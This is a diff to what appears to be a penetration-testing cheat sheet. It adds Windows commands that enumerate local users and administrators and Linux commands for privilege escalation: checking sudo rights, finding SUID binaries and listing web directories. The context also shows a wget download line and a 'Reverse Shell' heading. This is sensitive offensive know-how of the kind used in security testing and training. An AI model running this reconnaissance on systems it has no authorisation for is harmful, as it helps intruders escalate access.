@@ -407,6 +407,24 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 <br />
 
+```bash
+# Enumeration
+
+# CMD
+net users %username% #Me
+net users #All local users
+net localgroup #Groups
+net localgroup Administrators #Who is inside Administrators group
+whoami /all #Check the privileges
+
+# PS
+Get-WmiObject -Class Win32_UserAccount
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+```
+<br />
+
 ## Linux - Linpeas
 
 <br />
@@ -415,6 +433,22 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 [GTFOBINS](https://gtfobins.github.io/)
 
+<br />
+
+```bash
+
+#Check commands you can execute with sudo
+sudo -l 
+
+ #Find all SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Web files
+ls -alhR /var/www/ 2>/dev/null
+ls -alhR /srv/www/htdocs/ 2>/dev/null
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/ 2>/dev/null
+```
 <br />
 
 # Reverse Shell
